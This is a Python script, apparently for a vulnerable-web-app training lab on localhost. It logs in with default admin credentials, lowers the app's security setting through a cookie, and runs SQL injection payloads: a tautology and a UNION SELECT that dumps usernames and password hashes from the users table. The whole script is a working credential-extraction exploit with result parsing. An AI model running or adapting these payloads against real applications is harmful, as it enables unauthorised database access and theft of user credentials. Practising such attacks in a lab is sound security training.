
import requests
import re

s = requests.Session()

# Step 1: Get login page and extract CSRF token
r = s.get("http://localhost:28080/login.php")
token_match = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text)
if token_match:
    token = token_match.group(1)
    print(f"[+] CSRF Token: {token}")
else:
    print("[-] Could not find CSRF token")
    print(r.text[:500])
    exit()

# Step 2: Login
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Login response URL: {r.url}")
print(f"[+] Login status: {r.status_code}")

# Step 3: Set security level to low via cookie
s.cookies.set("security", "low", domain="localhost")

# Step 4: Test basic SQLi first - simple OR injection
print("\n=== Testing basic SQLi (OR '1'='1') ===")
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": "' OR '1'='1",
    "Submit": "Submit"
})
# Extract table data
results = re.findall(r'<td>([^<]+)</td>', r.text)
if results:
    print(f"[+] SQLi SUCCESS - Found {len(results)} table cells:")
    for i in range(0, len(results), 2):
        pair = results[i:i+2]
        print(f"    {pair[0]} | {pair[1] if len(pair)>1 else 'N/A'}")
else:
    print("[-] No table data found")
    # Check for errors
    errors = re.findall(r'<pre>([^<]+)</pre>', r.text)
    if errors:
        print(f"    Error: {errors[0]}")
    print(f"    Response snippet: {r.text[500:1000]}")

# Step 5: UNION-based SQLi to extract credentials
print("\n=== Testing UNION SQLi (extract user/password) ===")
r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
    "id": "' UNION SELECT user,password FROM users #",
    "Submit": "Submit"
})
results = re.findall(r'<td>([^<]+)</td>', r.text)
if results:
    print(f"[+] UNION SQLi SUCCESS - Dumped {len(results)} table cells:")
    for i in range(0, len(results), 2):
        pair = results[i:i+2]
        print(f"    Username: {pair[0]} | Password Hash: {pair[1] if len(pair)>1 else 'N/A'}")
else:
    print("[-] UNION SQLi failed")
    errors = re.findall(r'<pre>([^<]+)</pre>', r.text)
    if errors:
        print(f"    Error: {errors[0]}")

